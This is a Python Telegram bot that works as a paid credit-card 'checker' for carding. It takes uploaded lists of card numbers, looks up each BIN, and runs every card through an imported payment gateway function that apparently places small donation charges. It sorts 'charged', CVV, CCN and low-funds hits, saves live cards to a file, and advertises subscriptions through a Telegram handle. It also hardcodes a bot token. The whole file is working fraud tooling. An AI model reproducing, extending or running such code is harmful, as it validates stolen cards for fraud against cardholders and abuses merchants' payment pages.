import requests
import telebot, time, threading
from telebot import types
from gatet import Tele
import os
from func_timeout import func_timeout, FunctionTimedOut

token = '8299646020:AAHM7qDFRuBjcMRwFiLMwXMWxXxNs8mk0G4'
bot = telebot.TeleBot(token, parse_mode="HTML")

# ==========================================
# 👇 ALLOWED USERS LIST
ALLOWED_IDS = [
    '1915369904',    # Owner
    '',     # User 2
    '',     # User 3
    ''      # User 4
]
# ==========================================

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in ALLOWED_IDS:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return
    bot.reply_to(message, "💎 <b>Premium Checker Bot</b>\nSend your combo file now! 📂", parse_mode="HTML")

# 🔥 NEW FEATURE: Download Lives File 🔥
@bot.message_handler(commands=["getlives"])
def get_lives(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    
    try:
        if os.path.exists("lives.txt"):
            with open("lives.txt", "rb") as f:
                bot.send_document(message.chat.id, f, caption="✅ <b>Here are your Charged/Live Cards</b>", parse_mode="HTML")
        else:
            bot.reply_to(message, "No Live cards saved yet! ❌")
    except Exception as e:
        bot.reply_to(message, f"Error sending file: {e}")

# 🔥 NEW FEATURE: Clear Lives File 🔥
@bot.message_handler(commands=["clearlives"])
def clear_lives(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    
    if os.path.exists("lives.txt"):
        os.remove("lives.txt")
        bot.reply_to(message, "🗑️ <b>lives.txt has been cleared!</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "File is already empty.")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) not in ALLOWED_IDS:
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
        return

    # Threading စတင်ခြင်း
    t = threading.Thread(target=run_checker, args=(message,))
    t.start()

def run_checker(message):
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    chat_id = message.chat.id
    
    # NAME CONFLICT FIX
    file_name = f"combo_{chat_id}_{int(time.time())}.txt"
    stop_file = f"stop_{chat_id}.stop"

    try:
        ko = bot.reply_to(message, "💎 <b>Checking Started...</b> 🚀").message_id
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        
        with open(file_name, "wb") as w:
            w.write(ee)
            
        with open(file_name, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            
            for cc in lino:
                cc = cc.strip()
                
                # ===== STOP CHECK (1) =====
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>Process Stopped by User</b>')
                    os.remove(stop_file)
                    if os.path.exists(file_name): os.remove(file_name)
                    return
                
                # ===== BIN LOOKUP =====
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except:
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank', 'Unknown')
                
                # ===== STOP CHECK (2) =====
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>Process Stopped by User</b>')
                    os.remove(stop_file)
                    if os.path.exists(file_name): os.remove(file_name)
                    return

                start_time = time.time()
                
                # ===== CHECKER WITH TIMEOUT =====
                try:
                    last = str(func_timeout(100, Tele, args=(cc,)))
                except FunctionTimedOut:
                    last = 'Gateway Time Out ❌'
                except Exception as e:
                    print(e)
                    last = 'Error'
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                # ===== DASHBOARD VIEW (UI PRETTIFIED) =====
                # တွက်ချက်မှု အပိုင်း (Progress)
                current_checked = dd + ch + ccn + cvv + lowfund
                
                view_text = f"""💎 <b>Premium Checker</b>

💳 <b>Current:</b> <code>{cc}</code>
🟢 <b>Status:</b> {last}
➖➖➖➖➖➖➖➖
✅ <b>Hits:</b> {ch}   ❌ <b>Dead:</b> {dd}
🔐 <b>CCN:</b> {ccn}   ⚠️ <b>Low:</b> {lowfund}
🔄 <b>CVV:</b> {cvv}
➖➖➖➖➖➖➖➖
📊 <b>Progress:</b> {total} Cards
"""
                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(types.InlineKeyboardButton("🛑 STOP CHECKING", callback_data="stop"))
                
                is_hit = 'Donation Successful!' in last or 'funds' in last or 'security code' in last or 'Your card does not support' in last
                
                if is_hit or (dd % 15 == 0):
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except Exception as e:
                        pass 
                
                print(f"{chat_id} : {cc} -> {last}")
                
                # 🔥 SAVE LOGIC 🔥
                if 'Donation Successful!' in last or 'funds' in last:
                    with open("lives.txt", "a") as f:
                        f.write(f"{cc} - {last} - {bank} ({country})\n")

                # ==============================
                # ✅ HIT MESSAGES (RE-STYLED)
                # ==============================

                if 'Donation Successful!' in last:
                    ch += 1
                    msg = f'''✅ <b>Charge Hit!</b>

<b>💳 Card:</b> <code>{cc}</code>
<b>💠 Response:</b> Payment Successful ✅
➖➖➖➖➖➖➖➖
<b>🏦 Bin:</b> {brand} - {card_type}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country} - {country_flag}
➖➖➖➖➖➖➖➖
<b>⏱ Time:</b> {"{:.1f}".format(execution_time)} sec
<b>🤖 Bot By:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                # 🔥 CVV MESSAGE 🔥
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                    msg = f'''✅ <b>CVV Hit!</b>

<b>💳 Card:</b> <code>{cc}</code>
<b>💠 Response:</b> CVV Mismatch ⚠️
➖➖➖➖➖➖➖➖
<b>🏦 Bin:</b> {brand} - {card_type}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country} - {country_flag}
➖➖➖➖➖➖➖➖
<b>⏱ Time:</b> {"{:.1f}".format(execution_time)} sec
<b>🤖 Bot By:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                
                # 🔥 CCN MESSAGE 🔥
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    msg = f'''🔐 <b>CCN Live!</b>

<b>💳 Card:</b> <code>{cc}</code>
<b>💠 Response:</b> CCN Live ✅
➖➖➖➖➖➖➖➖
<b>🏦 Bin:</b> {brand} - {card_type}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country} - {country_flag}
➖➖➖➖➖➖➖➖
<b>⏱ Time:</b> {"{:.1f}".format(execution_time)} sec
<b>🤖 Bot By:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except:
                        pass
                    
                # 🔥 LOW FUNDS MESSAGE 🔥
                elif 'funds' in last:
                    lowfund += 1
                    msg = f'''⚠️ <b>Insufficient Funds!</b>

<b>💳 Card:</b> <code>{cc}</code>
<b>💠 Response:</b> Low Funds ⛔
➖➖➖➖➖➖➖➖
<b>🏦 Bin:</b> {brand} - {card_type}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country} - {country_flag}
➖➖➖➖➖➖➖➖
<b>⏱ Time:</b> {"{:.1f}".format(execution_time)} sec
<b>🤖 Bot By:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                    
                # 🔥 3D SECURE MESSAGE 🔥
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1 # Or count as 3D depending on preference
                    msg = f'''⚠️ <b>3D Secure!</b>

<b>💳 Card:</b> <code>{cc}</code>
<b>💠 Response:</b> 3D Action Required 🔄
➖➖➖➖➖➖➖➖
<b>🏦 Bin:</b> {brand} - {card_type}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country} - {country_flag}
➖➖➖➖➖➖➖➖
<b>⏱ Time:</b> {"{:.1f}".format(execution_time)} sec
<b>🤖 Bot By:</b> @Rusisvirus'''
                    bot.reply_to(message, msg)
                        
                else:
                    dd += 1
                    time.sleep(1)
        
        if os.path.exists(file_name): os.remove(file_name)
        bot.edit_message_text(chat_id=chat_id, message_id=ko, text='✅ <b>Checking Completed!</b>\nBot By ➜ @Rusisvirus')

    except Exception as e:
        print(f"Error for {chat_id}: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    stop_file = f"stop_{call.message.chat.id}.stop"
    with open(stop_file, "w") as file:
        pass
    bot.answer_callback_query(call.id, "Stopping...")

# ===== SAFE POLLING =====
import telebot.apihelper as apihelper
apihelper.REQUEST_TIMEOUT = 30

print("🤖 Bot Started with New UI...")
while True:
    try:
        bot.polling(non_stop=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        print("Polling error:", e)
        time.sleep(5)
